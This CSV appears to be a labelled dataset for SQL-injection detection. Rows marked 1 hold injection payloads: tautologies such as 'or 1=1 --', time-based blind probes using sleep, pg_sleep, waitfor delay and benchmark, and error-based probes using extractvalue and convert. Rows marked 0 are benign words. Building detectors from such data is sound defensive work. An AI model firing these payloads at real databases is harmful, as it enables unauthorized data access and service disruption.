Sentence,Label
 or 1  =  1 --,1
 or 3  =  3 --,1
"""   )    )   ;waitfor delay '0:0:__TIME__'--",1
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
"""  )  ;waitfor delay '0:0:__TIME__'--",1
"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
"""  )   or true--",1
""" or 0  =  0 --",1
""" or 1  =  1--",1
""" or benchmark  (  10000000,MD5  (  1   )    )   #",1
""" or pg_sleep  (  __TIME__  )  --",1
""" or sleep  (  __TIME__  )  #",1
""" or true--",1
""";waitfor delay '0:0:__TIME__'--",1
#NAME?,0
$ventador,0
$despumar,0
$amarulencia,0
$embrutecimiento,0
(  7098  =  7098 and sleep  (  5   )    ),1
"(  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  9339  =  9339  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )",1
"(  extractvalue  (  1759,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1759  =  1759,1   )    )     )  ,0x717a767a71   )    )     )",1
"(  select   (  case when   (  4232  =  4232  )   then   (  select benchmark  (  5000000,md5  (  0x6b637544   )    )     )   else 4232*  (  select 4232 from mysql.db  )   end   )    )",1
(  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ),1
(  select   (  case when   (  3592  =  3592  )   then 3592 else 3592*  (  select 3592 from information_schema.character_sets  )   end   )    ),1
(  select   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  select 4108 from information_schema.character_sets  )   end   )    ),1
(  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ),1
(  select   (  case when   (  9337  =  9337  )   then waitfor delay '0:0:5' else 9337*  (  select 9337 from master..sysdatabases  )   end   )    ),1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  ),1
(  select * from   (  select  (  sleep  (  5   )    )     )  lrov  ),1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,1
(  select * from   (  select  (  sleep  (  5   )    )     )  acdk  )  #,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||',1
